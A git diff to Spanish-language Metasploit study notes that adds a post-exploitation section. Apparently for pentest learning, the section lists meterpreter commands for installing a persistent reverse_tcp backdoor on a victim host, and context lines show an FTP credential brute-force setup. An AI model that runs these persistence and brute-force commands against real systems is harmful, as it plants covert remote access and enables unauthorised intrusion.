@@ -3,6 +3,8 @@
 Metasploit es un framework para pentest y ataque.  
 Tiene varias herramientas incorporadas.  
 
+## Explotación
+
 En Kali Linux : `/usr/share/metasploit-framework/`  
 
 Comandos basicos  
@@ -157,6 +159,25 @@ set BLANK_PASSWORDS true
 set USERPASS_FILE Destop/ftppass.txt
 run
 ```
+
+## Post Explotación  
+Mantener el accesso.  
+Despues de ejecutar un exploit y estar dentro del sistema: 
+
+```
+meterpreter> sysinfo
+run persistence -h
+run persistence -A -P windows/meterpreter/reverse_tcp -X -i 10 -p 5555 -r 172.16.99.222 #victim ip
+background
+sessions 
+sessions -i X 
+sysinfo
+sessions -l
+```
+
+Luego hay remover backdoor.  
+Habria q borrar el archivo del path remoto, remover linea de regedit tambien si lo fuera, etc.  
+
 
 
 
